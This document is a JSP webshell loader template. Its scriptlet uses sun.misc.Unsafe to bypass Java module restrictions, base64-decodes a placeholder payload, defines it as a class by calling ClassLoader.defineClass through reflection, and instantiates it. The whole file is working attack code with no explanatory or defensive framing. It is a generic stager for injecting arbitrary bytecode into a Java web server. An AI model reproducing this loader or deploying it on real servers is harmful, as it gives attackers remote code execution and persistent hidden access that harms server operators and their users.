<%
    Object unsafe = null;
    Object rawModule = null;
    long offset = 48;
    java.lang.reflect.Method getAndSetObjectM = null;
    try {
        Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
        java.lang.reflect.Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
        unsafeField.setAccessible(true);
        unsafe = unsafeField.get(null);
        rawModule = Class.class.getMethod("getModule").invoke(this.getClass(), (Object[]) null);
        Object module = Class.class.getMethod("getModule").invoke(Object.class, (Object[]) null);
        java.lang.reflect.Method objectFieldOffsetM = unsafe.getClass().getMethod("objectFieldOffset", java.lang.reflect.Field.class);
        offset = (Long) objectFieldOffsetM.invoke(unsafe, Class.class.getDeclaredField("module"));
        getAndSetObjectM = unsafe.getClass().getMethod("getAndSetObject", Object.class, long.class, Object.class);
        getAndSetObjectM.invoke(unsafe, this.getClass(), offset, module);
    } catch (Throwable ignored) {
    }
    String base64Str = "{{base64Str}}";
    byte[] bytecode = null;
    try {
        Class base64Clz = Class.forName("java.util.Base64");
        Object decoder = base64Clz.getMethod("getDecoder").invoke(null);
        bytecode = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
    } catch (ClassNotFoundException ee) {
        Class datatypeConverterClz = Class.forName("javax.xml.bind.DatatypeConverter");
        bytecode = (byte[]) datatypeConverterClz.getMethod("parseBase64Binary", String.class).invoke(null, base64Str);
    }
    java.lang.reflect.Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
    defMethod.setAccessible(true);
    Class<?> clazz = (Class<?>) defMethod.invoke(Thread.currentThread().getContextClassLoader(), bytecode, 0, bytecode.length);
    if (getAndSetObjectM != null) {
        getAndSetObjectM.invoke(unsafe, this.getClass(), offset, rawModule);
    }
    clazz.newInstance();
%>